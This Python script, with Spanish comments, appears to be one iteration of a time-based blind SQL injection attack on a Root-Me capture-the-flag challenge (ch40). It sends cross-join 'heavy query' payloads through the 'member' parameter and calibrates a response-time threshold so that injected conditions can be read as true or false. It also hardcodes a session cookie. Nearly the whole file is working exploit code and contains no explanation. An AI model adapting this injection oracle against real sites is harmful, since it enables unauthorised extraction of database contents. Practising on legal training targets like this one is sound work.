#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 44 - RECALIBRAR UMBRAL
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true_normal(self, condition, threshold):
        """TRUE = lento (> threshold)"""
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t > threshold
    
    def is_true_invertido(self, condition, threshold):
        """TRUE = rápido (< threshold)"""
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < threshold

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  RECALIBRANDO UMBRAL")
print("="*70)

# Medir tiempos base
print("\n[1] Midiendo tiempos base...")

tiempos = {
    "baseline": [],
    "true_heavy": [],
    "false_heavy": []
}

# Baseline (sin heavy)
for _ in range(5):
    t = injector.test_payload("1", repeats=1)
    tiempos["baseline"].append(t)
    time.sleep(0.1)

# TRUE con heavy (1=1)
for _ in range(5):
    t = injector.test_payload("1 OR (1=1) OR (SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)", repeats=1)
    tiempos["true_heavy"].append(t)
    time.sleep(0.1)

# FALSE con heavy (1=2)
for _ in range(5):
    t = injector.test_payload("1 OR (1=2) OR (SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)", repeats=1)
    tiempos["false_heavy"].append(t)
    time.sleep(0.1)

baseline = statistics.median(tiempos["baseline"])
true_time = statistics.median(tiempos["true_heavy"])
false_time = statistics.median(tiempos["false_heavy"])

print(f"  Baseline: {baseline:.2f}ms")
print(f"  TRUE (1=1): {true_time:.2f}ms")
print(f"  FALSE (1=2): {false_time:.2f}ms")

# Determinar modo y umbral
if true_time > false_time:
    modo = "NORMAL (TRUE = lento)"
    threshold = (true_time + false_time) / 2
    is_true = lambda cond: injector.is_true_normal(cond, threshold)
else:
    modo = "INVERTIDO (TRUE = rápido)"
    threshold = (true_time + false_time) / 2
    is_true = lambda cond: injector.is_true_invertido(cond, threshold)

print(f"\n[2] Modo detectado: {modo}")
print(f"    Umbral: {threshold:.2f}ms")

# Verificar
print("\n[3] Verificando técnica...")
print(f"  1=1: {is_true('1=1')} (debería ser True)")
print(f"  1=2: {is_true('1=2')} (debería ser False)")

if is_true('1=1') == True and is_true('1=2') == False:
    print("  ✅ Técnica funciona correctamente")
else:
    print("  ❌ Técnica NO funciona")
    print("  Probando con umbrales alternativos...")
    
    for t in range(25, 45):
        if true_time > false_time:
            test_true = injector.is_true_normal('1=1', t)
            test_false = injector.is_true_normal('1=2', t)
        else:
            test_true = injector.is_true_invertido('1=1', t)
            test_false = injector.is_true_invertido('1=2', t)
        
        if test_true == True and test_false == False:
            print(f"    Umbral {t} funciona!")
            threshold = t
            break
